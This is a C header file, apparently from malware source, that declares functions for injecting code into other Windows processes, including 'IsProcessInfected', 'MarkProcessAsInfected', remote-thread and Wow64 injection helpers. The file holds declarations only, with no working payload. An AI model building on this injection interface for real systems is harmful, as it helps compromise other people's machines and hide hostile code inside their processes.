#ifndef PE_FIX_H_INCLUDED
#define PE_FIX_H_INCLUDED

bool IsProcessInfected(DWORD dwPID);
HANDLE MarkProcessAsInfected(DWORD dwPID);
bool InjectWnd(LPTHREAD_START_ROUTINE lpFunction,HWND hWnd,LPVOID lpParam);
bool InjectProc(LPVOID lpFunction,DWORD dwPID,LPVOID lpParam);

typedef BOOL WINAPI _IsWow64Process(HANDLE hProcess,PBOOL Wow64Process);

#define REMOTE_THREAD(Name) DWORD WINAPI Name(LPVOID tmp)

typedef bool Wow64InjectProc(LPVOID lpFunction,DWORD dwPID,LPVOID lpParam);

#define SYSINJ_WAIT_ATTEMPTS 3
#define SYSINJ_WAIT_TIMEOUT 10

typedef WINBASEAPI VOID WINAPI __Sleep(DWORD dwMilliseconds);
typedef WINBASEAPI BOOL WINAPI __VirtualFree(LPVOID lpAddress,SIZE_T dwSize,DWORD dwFreeType);
typedef WINBASEAPI BOOL WINAPI __GetExitCodeThread(HANDLE hThread,LPDWORD lpExitCode);

struct MEMINFO
{
    LPVOID lpStartingAddress;
    __VirtualFree *lpVirtualFree;
    __GetExitCodeThread *lpGetExitCodeThread;
    __Sleep *lpSleep;
    HANDLE hThread;
};

struct REMOTE_THREAD_INFO
{
    LPTHREAD_START_ROUTINE lpFunc;
    LPVOID lpParam;
};

void DestroyInject();

#endif // PE_FIX_H_INCLUDED
